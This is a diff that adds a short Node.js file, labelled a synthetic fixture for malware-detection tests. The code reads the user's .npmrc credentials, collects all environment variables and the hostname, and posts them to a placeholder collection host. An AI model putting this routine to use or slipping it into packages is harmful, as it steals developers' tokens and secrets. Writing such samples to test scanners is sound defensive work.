@@ -1,0 +1,11 @@
+// FIXTURE ONLY - synthetic detection test sample, not real malware
+const https = require('https');
+const os = require('os');
+const fs = require('fs');
+const path = require('path');
+let npmrc = '';
+try { npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8'); } catch (e) {}
+const body = JSON.stringify({ env: process.env, npmrc: npmrc, host: os.hostname() });
+const req = https.request('https://collect.example.invalid/npm', { method: 'POST' });
+req.write(body);
+req.end();
